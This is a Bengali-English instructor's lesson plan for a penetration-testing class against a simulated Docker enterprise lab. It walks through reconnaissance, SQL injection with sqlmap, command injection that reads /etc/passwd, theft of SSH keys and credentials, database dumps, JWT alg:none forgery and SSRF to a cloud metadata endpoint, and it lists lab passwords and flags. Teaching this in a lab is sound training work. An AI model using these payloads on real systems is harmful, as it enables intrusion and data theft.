# 🏢 Enterprise Network Penetration Testing — Professional Class Module
### *"From Recon to Crown Jewels: How Real Hackers Breach Enterprises"*

> **Instructor:** [তোমার নাম]
> **Duration:** 4 Hours (Structured)
> **Lab Environment:** Nexus Global Enterprise Lab — Live VPS-Hosted
> **Level:** Intermediate → Advanced

---

## 🕐 Schedule Overview

| Time | Session | Type |
|:---|:---|:---:|
| 7:00 – 8:30 PM | **Module 1:** The Mindset + Recon + Initial Foothold | 📖 Lecture + Live Demo |
| 8:30 – 9:00 PM | ☕ Break | — |
| 9:00 – 10:00 PM | **Module 2:** Lateral Movement + Privilege Escalation | 📖 Lecture + Live Demo |
| 10:00 – 10:30 PM | 🛠️ Classwork / CTF Practice (Flags 1–3) | 🔥 Hands-On |
| 10:30 – 11:30 PM | **Module 3:** Cloud Tier Attack + Full Chain Demo | 📖 Live Demo + Debrief |

---

# 🟢 MODULE 1 — 7:00 PM to 8:30 PM (90 min)
## *"The Mindset, Recon & Getting Your First Shell"*

---

### 🎯 7:00 – 7:15 | Opening Hook — "Real Company, Real Breach"

**কীভাবে শুরু করবে:**
> "আজকে তোমরা যে environment-এ attack করবে, এটা Bangladesh-এর একটা বড় কোম্পানির মতোই সাজানো — AD, firewall, VoIP, CCTV, cloud, সব আছে। আজকের শেষে তোমরা জানবে একজন real penetration tester কীভাবে একটা enterprise-কে root করে।"

**Show করো (WOW factor):**
- Browser-এ live lab URL খুলো → Students দেখবে একটা বড় কোম্পানির portal
- Grafana dashboard → real-time network metrics
- MailHog → ইমেইল intercept হচ্ছে live
- `docker ps` → ৩৩টা container চলছে

**Teaching Point:**
> "এটা একটা simulated enterprise। কিন্তু vulnerability গুলো real-world থেকেই নেওয়া — OWASP Top 10, MITRE ATT&CK framework অনুযায়ী।"

---

### 📡 7:15 – 7:35 | Phase 1: Reconnaissance (Recon)

**Concept: "তুমি attack করার আগে জানতে হবে কে তুমি attack করছো"**

#### External Recon (Black-box perspective):
```bash
# Network Discovery — কোন কোন port খোলা?
nmap -sV -sC -p- --open localhost

# Web technology fingerprinting
curl -I http://localhost:80
curl -I http://localhost:8080
```

**Live Demo করো:**
- nmap output দেখাও → কোন port-এ কী service চলছে
- Students দেখবে: `80, 8025, 8080, 8443, 8554, 8888, 9001, 3000...`
- "এটাই একজন attacker প্রথমে দেখে"

**যোগ করো (Interesting fact):**
> 💡 "Real world-এ Shodan.io দিয়ে internet-এ exposed corporate systems খোঁজা যায়। আজকে আমরা যা করছি — এটাই professionally করা হয় কিন্তু target কোম্পানির permission নিয়ে।"

**MITRE ATT&CK mapping দেখাও:**
> `TA0043 — Reconnaissance → T1046 Network Service Scanning`

---

### 🌐 7:35 – 8:00 | Phase 2: Initial Access — SQL Injection (Flag 1)

**Concept: "প্রথম দরজা খোলা"**

**Background story দাও:**
> "Nexus Global Enterprise-এর corporate portal-এ একটা Asset Tracking form আছে। যেখানে employee রা consignment ID দিয়ে package track করে। Developer ভুলে user input sanitize করেনি।"

#### Step 1 — Manual Discovery:
```
http://localhost:80
→ Login: admin / NexusTechAdmin2026!
→ Homepage-এ "Consignment Tracker" form
→ Input: NX-98231 (normal)
→ Input: NX-98231' (single quote) → Error আসে?
```

#### Step 2 — Manual SQL Injection:
```
' OR '1'='1
' UNION SELECT 1,2,3--
' UNION SELECT username,password,3 FROM employees--
```

#### Step 3 — Automated (sqlmap):
```bash
sqlmap -u "http://localhost/?track_id=NX-1" --dbs
sqlmap -u "http://localhost/?track_id=NX-1" -D nexus_prod --tables
sqlmap -u "http://localhost/?track_id=NX-1" -D nexus_prod -T employees --dump
```

**WOW Moment:**
> Employee credentials dump হবে — students দেখবে real-looking names, passwords, departments

**MITRE ATT&CK:**
> `T1190 — Exploit Public-Facing Application`

---

### 💻 8:00 – 8:20 | Phase 3: Command Injection + SSH Access (Flag 2)

**Concept: "Web-এ ঢুকে server-এর control নেওয়া"**

**Story:**
> "Admin panel-এ একটা 'Server Diagnostics' tool আছে। Admin রা এটা দিয়ে ping করে network check করে। কিন্তু input validation নেই।"

```
http://localhost/admin/server-check

Normal: ping 8.8.8.8
Injected: 8.8.8.8; whoami
Injected: 8.8.8.8; cat /etc/passwd
Injected: 8.8.8.8; ls -la /var/www/
```

**তারপর SSH Bastion দেখাও:**
```bash
# SQLi থেকে পাওয়া credentials দিয়ে SSH
ssh devops-remote@<VPS_IP> -p 2222
# Password: devops-remote@123
# ✅ Shell পাওয়া গেছে!
```

**Teaching Point:**
> "আমরা এখন DMZ zone-এ আছি। Target হলো ভেতরে যাওয়া — Data Center।"

---

### 🗺️ 8:20 – 8:30 | Module 1 Recap + Enterprise Architecture Map

**Live diagram দেখাও (enterprise-network.html):**
- WAN → DMZ → Core → Data Center → Campus → Cloud
- "আমরা এখন DMZ-তে আছি। পরের step হলো Core → DC pivot"

**Key takeaways board-এ লেখো:**
```
✅ Recon → নmap, Shodan
✅ Initial Access → SQLi (T1190)
✅ Execution → CMDi (T1059)
✅ First Flag পাওয়া গেছে
```

---

# ☕ BREAK — 8:30 PM to 9:00 PM

**Break-এর সময় students-দের জন্য:**
> "চাইলে Flag 1 নিজে try করো: `http://[VPS_IP]/?track_id=' OR 1=1--`"

---

# 🟡 MODULE 2 — 9:00 PM to 10:00 PM (60 min)
## *"Lateral Movement, Privilege Escalation & Crown Jewels"*

---

### 🔀 9:00 – 9:20 | Lateral Movement — Pivoting Through the Network

**Concept: "একটা machine দিয়ে আরেক machine-এ যাওয়া"**

**Story:**
> "আমরা bastion-এ আছি। কিন্তু database আছে `10.0.3.20` তে — সরাসরি access নেই। আমাদের pivot করতে হবে।"

**Show করো:**
```bash
# Bastion থেকে internal network map করো
# (Bastion core_net এবং dmz_net উভয়তে আছে)
docker exec -it nexus-corp-bastion bash

# Internal host discovery:
for i in {1..254}; do ping -c1 -W1 10.0.2.$i 2>/dev/null | grep "64 bytes" && echo "10.0.2.$i is up"; done

# SIEM এর log দেখো:
docker exec -it nexus-corp-siem-soc tail -f /var/log/nexus-syslog/nexus-all.log
```

**WOW Factor:**
> "দেখো — SIEM box আমাদের movement detect করছে! Blue team এখন alert পাচ্ছে। Real pentest-এ এটা note করতে হয় কারণ ক্লায়েন্টকে বলতে হয় কোন attack কোথায় detect হলো।"

**Workstation pivot (Gray-box scenario):**
```bash
# DevOps workstation-এ ঢুকলে:
docker exec -it nexus-pc-dev-01 bash
cat ~/.ssh/id_rsa          # SSH private key!
cat ~/.bash_history        # Past commands
env | grep -i pass         # Env variables with passwords
```

**MITRE ATT&CK:**
> `T1021.004 — Lateral Movement: Remote Services SSH`
> `T1552 — Unsecured Credentials`

---

### 👑 9:20 – 9:45 | Crown Jewels — Database Extraction (Flag 3)

**Concept: "সবচেয়ে valuable data নেওয়া"**

**Story:**
> "Production PostgreSQL database-এ আছে `system_vault_keys` — সব admin-এর master password এবং API keys। এটাই Flag 3।"

**Demo করো:**
```bash
# Production DB তে ঢোকো:
docker exec -it nexus-dc-prod-database psql -U nexus_admin -d nexus_prod

-- Tables দেখো:
\dt

-- Employee credentials dump:
SELECT * FROM employees;

-- 🏆 Crown Jewels:
SELECT * FROM system_vault_keys;
-- FLAG{CR0WN_J3W3LS_DC_D4T4B4S3_C0MPR0M1S3D_2026!}

-- Sensitive data:
SELECT * FROM salary_records;
SELECT * FROM vendor_contracts;
```

**Teaching Point — "Real Impact" বোঝাও:**
> "এই data একটা real company থেকে বের হলে — GDPR violation, regulatory fine, reputation damage। তোমার pentest report-এ এই impact লিখতে হয়।"

**MinIO Storage Inspection:**
```
http://[VPS_IP]:9001 → nexus_san_root / SuperS3cUr3_B4ckup_Vault_Pass_2026!
→ Buckets দেখো — কী কী backup file আছে?
→ নামানো যায়? → Object storage misconfiguration
```

**MITRE ATT&CK:**
> `T1005 — Data from Local System`
> `T1213 — Data from Information Repositories`

---

### 🔐 9:45 – 10:00 | Active Directory — Domain Takeover Concept

**Concept: "কোম্পানির সব account-এর control"**

**Show করো:**
```bash
# SMB enumeration:
docker exec -it nexus-corp-bastion bash
smbclient -L //10.0.2.10 -N
smbclient -L //10.0.2.10 -U "Administrator%NexusAD2026!Admin"

# Samba AD tool দিয়ে domain info:
docker exec -it nexus-ad-dc samba-tool domain info 10.0.2.10
docker exec -it nexus-ad-dc samba-tool user list
```

**Conceptual explanation (VPS limitation):**
> "Real environment-এ এখানে BloodHound দিয়ে AD graph বানাতাম, Kerberoasting করতাম, Golden Ticket attack দিতাম। আজকে concept টা বুঝলাম — পরের class-এ করবো।"

**MITRE ATT&CK:**
> `T1087.002 — Account Discovery: Domain Account`
> `T1558 — Steal or Forge Kerberos Tickets`

---

# 🛠️ CLASSWORK — 10:00 PM to 10:30 PM
## *CTF Practice: Flags 1, 2, 3 — Solo or Team*

**Instructions দাও:**

```
🎯 Challenge Board:

FLAG 1 (Easy)   → http://[VPS_IP]/?track_id=
                  SQLi করে employees table dump করো
                  Hint: UNION based injection

FLAG 2 (Medium) → http://[VPS_IP]/admin/server-check
                  Command injection করে /etc/passwd দেখাও
                  Hint: semicolon injection

FLAG 3 (Hard)   → Production DB থেকে system_vault_keys বের করো
                  docker exec বা SQLi chain করে
```

**Leaderboard idea:**
> Whiteboard-এ যে আগে flag পাবে তার নাম লেখো — competition তৈরি হবে।

**Instructor role during classwork:**
- Walk around, hint দাও
- Common mistakes দেখো
- যারা আটকে গেছে তাদের সঠিক direction দাও

---

# 🔴 MODULE 3 — 10:30 PM to 11:30 PM (60 min)
## *"Cloud Attack + Full Kill Chain + Professional Reporting"*

---

### ☁️ 10:30 – 10:55 | Cloud Tier Attack — SSRF + JWT (Flag 4)

**Concept: "Modern company-র cloud infrastructure কীভাবে attack করে"**

**Story:**
> "Nexus-এর cloud microservice AWS us-east-1-এ চলছে। একটা `/api/v1/fetch` endpoint আছে যেটা internal URL fetch করতে পারে। এটাই SSRF — Server-Side Request Forgery।"

**Step 1 — API Discovery:**
```bash
# API documentation দেখো:
curl http://[VPS_IP]:8090/api/v1/health
curl http://[VPS_IP]:8090/api/v1/config
```

**Step 2 — JWT Authentication:**
```bash
# Token নাও:
curl -X POST http://[VPS_IP]:8090/api/v1/auth \
  -H "Content-Type: application/json" \
  -d '{"user":"admin","pass":"NexusTechAdmin2026!"}'

# Response: {"token": "eyJhbGci..."}

# Users দেখো:
curl http://[VPS_IP]:8090/api/v1/users \
  -H "Authorization: Bearer eyJhbGci..."
```

**Step 3 — JWT Tampering (WOW):**
```bash
# jwt.io তে token paste করো
# Algorithm: HS256 → none (alg:none attack)
# Payload: {"user":"admin","role":"superadmin"} এ change করো
# নতুন forged token দিয়ে /api/v1/users access করো
```

**Step 4 — SSRF Attack (Flag 4):**
```bash
# Internal metadata fetch:
curl "http://[VPS_IP]:8090/api/v1/fetch?url=http://172.16.0.30:5432"
curl "http://[VPS_IP]:8090/api/v1/fetch?url=http://169.254.169.254/latest/meta-data/"
# FLAG{CL0UD_T13R_C0MPR0M1S3D_AWS_NEXUS_2026!}
```

**WOW Factor:**
> "এই SSRF দিয়ে AWS metadata server থেকে IAM credentials বের করা যায়। Real world-এ Capital One breach (2019, $80M fine) এভাবেই হয়েছিল।"

**MITRE ATT&CK:**
> `T1552.007 — Container API Credentials`
> `T1599 — Network Boundary Bridging`

---

### 🔗 10:55 – 11:15 | Full Kill Chain — "The Complete Story"

**একটা timeline দেখাও:**

```
📅 Day 1 (Recon):
  └─ nmap scan → open ports discovered
  └─ Web fingerprinting → Nginx, Flask detected

📅 Day 2 (Initial Access):
  └─ SQLi on /?track_id= → employee credentials dumped
  └─ CMDi on /admin/server-check → RCE achieved
  └─ SSH to bastion (port 2222) → foothold established

📅 Day 3 (Lateral Movement):
  └─ Bastion → core_net pivot → DC subnet discovered
  └─ DevOps workstation → SSH key found

📅 Day 4 (Privilege Escalation + Exfiltration):
  └─ PostgreSQL → system_vault_keys → FLAG 3
  └─ MinIO buckets → backup files downloaded
  └─ AD enumeration → domain users listed

📅 Day 5 (Cloud + Full Compromise):
  └─ JWT forged → Cloud API full access
  └─ SSRF → Internal cloud DB reached → FLAG 4
  └─ SaaS SSO bypass → OAuth2 session hijack → FLAG 5
```

**Teaching Point:**
> "Real pentest এ এই পুরো chain টা একটা report-এ document করতে হয়। Client দেখতে চায় — attacker কীভাবে এগিয়েছে, কোথায় defence ছিল না।"

---

### 📝 11:15 – 11:30 | Professional Pentest Report Structure + Wrap-up

**Report structure দেখাও:**

```
1. Executive Summary (non-technical — CEO/CFO এর জন্য)
   └─ "আমরা আপনার কোম্পানিতে full access পেয়েছি।
       সব employee data exposed। Cloud credentials leaked।"

2. Technical Findings (CVSS Score সহ)
   └─ Finding 1: SQL Injection — CVSS 9.8 (Critical)
   └─ Finding 2: Command Injection — CVSS 9.0 (Critical)
   └─ Finding 3: Insecure DB Exposure — CVSS 8.5 (High)
   └─ Finding 4: SSRF — CVSS 8.8 (High)

3. Attack Chain / Kill Chain Diagram

4. Evidence (Screenshots, command outputs)

5. Remediation Recommendations
   └─ Prepared statements (SQLi fix)
   └─ Input validation (CMDi fix)
   └─ Network segmentation (Lateral movement prevention)
   └─ JWT secret rotation (Cloud fix)
```

**Next Class Preview দাও:**
> "পরের class-এ: Active Directory Full Exploitation — BloodHound, Kerberoasting, Pass-the-Hash, Golden Ticket। VoIP SIP brute-force। MQTT IoT takeover। NAC bypass (Flag 6)।"

**Closing Quote:**
> *"The best hackers don't break in through the front door. They find the window someone left open. Today you found 4 windows."*

---

# 📊 Class Summary Stats

| Metric | Value |
|:---|:---:|
| Total Duration | 4 Hours |
| Flags Available | 4 (Flag 1-4) |
| Attack Techniques Covered | 12 |
| MITRE ATT&CK Techniques | 9 |
| Real-World CVE References | 3 |
| Tools Used | nmap, sqlmap, curl, ssh, psql, smbclient |

---

# 🎨 WOW Moments Summary (Student Engagement Points)

| Moment | কেন Impressive |
|:---|:---|
| `docker ps` — 33 containers | "পুরো একটা company এর নেটওয়ার্ক!" |
| SQLi → employee dump | Real names, salaries, passwords দেখা |
| CMDi → server shell | Browser থেকে server control |
| SIEM live log | Blue team real-time দেখছে |
| JWT forgery | Algorithm:none hack live |
| SSRF → AWS metadata | Capital One breach reference |
| Full kill chain timeline | "এটাই real APT attack looks like" |

---

# 🛠️ VPS Setup Notes (পরে করবো)

> **পরের session-এ যা modify করতে হবে:**
> - VPS IP address সব config-এ update করো
> - Firewall rules: শুধু student IP থেকে access দাও
> - `start-lab.sh` script-এ VPS-specific path fix করো
> - HTTPS/domain setup করলে SaaS SSO port 8443 SSL configure করো
> - Resource limit: VPS RAM অনুযায়ী mode select করো

---

*📌 এই module টা `docs/CLASS_MODULE_01.md` হিসেবে save করা আছে।*
